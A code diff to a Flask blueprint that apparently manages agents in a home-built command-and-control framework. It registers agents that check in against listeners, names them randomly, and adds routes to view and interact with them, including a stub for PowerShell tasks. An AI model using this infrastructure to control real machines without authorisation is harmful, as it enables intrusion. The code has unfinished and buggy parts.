@@ -1,17 +1,23 @@
 from flask import Blueprint, render_template, redirect, request, url_for
+from ..listeners.listeners import load_listeners
+from .agent_info import AgentInfo
+from random import choice
+from string import ascii_uppercase
 import flask
 import os
 import json
 agents_bp = Blueprint('agents', __name__, template_folder='templates', static_folder='static')
 
-
 class Agent:
 
-    def __init__(self, name, listener, type, remote_address, hostname):
+    def __init__(self, agent_name, listener_name, listener_type, bind_address, bind_port, agent_type, remote_address, hostname):
 
-        self.name = name
-        self.listener = listener
-        self.type = type
+        self.agent_name = agent_name
+        self.listener_name = listener_name
+        self.listener_type = listener_type
+        self.bind_address = bind_address
+        self.bind_port = bind_port
+        self.agent_type = agent_type
         self.remote_address = remote_address
         self.hostname = hostname
         self.sleep = 3
@@ -20,49 +26,84 @@ class Agent:
 
     def save(self):
         data = {
-            'name': self.name,
-            'listener': self.listener,
-            'type': self.type,
+            'agent_name': self.agent_name,
+            'listener_name': self.listener_name,
+            'listener_type': self.listener_type,
+            'bind_address': self.bind_address,
+            'bind_port': self.bind_port,
+            'agent_type': self.agent_type,
             'remote_address': self.remote_address,
             'hostname': self.hostname,
         }
-        filename = os.path.join(self.path, f"{self.name}_agent.json")
+        filename = os.path.join(self.path, f"{self.agent_name}_agent.json")
         with open(filename, 'w') as f:
             json.dump(data, f)
+
+    def writeTask(self, task):
+        if self.agent_type == "PowerShell":
+            task = "VALID " + task
 
 @agents_bp.route('/', methods=['GET','POST'])
 def agents():
     if request.method == 'POST':
         hostname = flask.request.form.get("name")
-        type = flask.request.form.get("type")
+        agent_type = flask.request.form.get("type")
         remote_address = flask.request.form.get("remote_ip")
-        print('agent checked in', remote_address, hostname, type)
+        bind_address = flask.request.remote_addr
+        print('agent checked in', remote_address, hostname, agent_type)
 
-        agent = Agent('agent1', 'test_2', type, remote_address, hostname)
+        listener_list = load_listeners()
+        for listener in listener_list:
+            if listener[3] == bind_address:
+                agent_name = ''.join(choice(ascii_uppercase) for i in range(6))
+                agent = Agent(agent_name, listener[0], listener[1], listener[3], listener[4], agent_type, remote_address, hostname)
+                agent.save()
 
-        agent.save()
-    else:
-        agents = []
+    agents = []
 
-        agents_directory = "database/agents/"
-        if os.path.exists(agents_directory):
-            for agent_name in os.listdir(agents_directory):
-                file_path = os.path.join(agents_directory, agent_name)
-                with open(file_path, 'r') as f:
-                    data = json.load(f)
+    agents_directory = "database/agents/"
+    if os.path.exists(agents_directory):
+        for agent_name in os.listdir(agents_directory):
+            file_path = os.path.join(agents_directory, agent_name)
+            with open(file_path, 'r') as f:
+                data = json.load(f)
 
-                agent = Agent(**data)
+            agent = Agent(**data)
 
-                agents.append((agent.name,
-                                  agent.listener,
-                                  agent.type,
-                                  agent.remote_address,
-                                  agent.hostname))
+            agents.append((agent.agent_name,
+                              agent.listener_name,
+                              agent.agent_type,
+                              agent.remote_address,
+                              agent.hostname))
 
     return render_template('agents.html', agents = agents)
 
+@agents_bp.route('/<agent>/info', methods=['GET'])
+def agent_info(agent):
+    agents_directory = "database/agents/"
+    file_path = os.path.join(agents_directory, f"{agent}_agent.json")
 
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as f:
+            data = json.load(f)
 
+        agent = Agent(**data)
+        form = AgentInfo(obj=agent)
+        return render_template('agent_info.html', agent=agent, form = form)
+
+    return "Agent not found", 404
+
+@agents_bp.route('/<agent>/interact', methods=['GET'])
+def agent_interact(agent):
+    agents_directory = "database/agents/"
+    file_path = os.path.join(agents_directory, f"{agent}_agent.json")
+
+    if os.path.exists(file_path):
+        with open(file_path, 'r') as f:
+            data = json.load(f)
+
+        agent = Agent(**data)
+    return render_template('agent_interact.html', agent = agent)
 
 
 
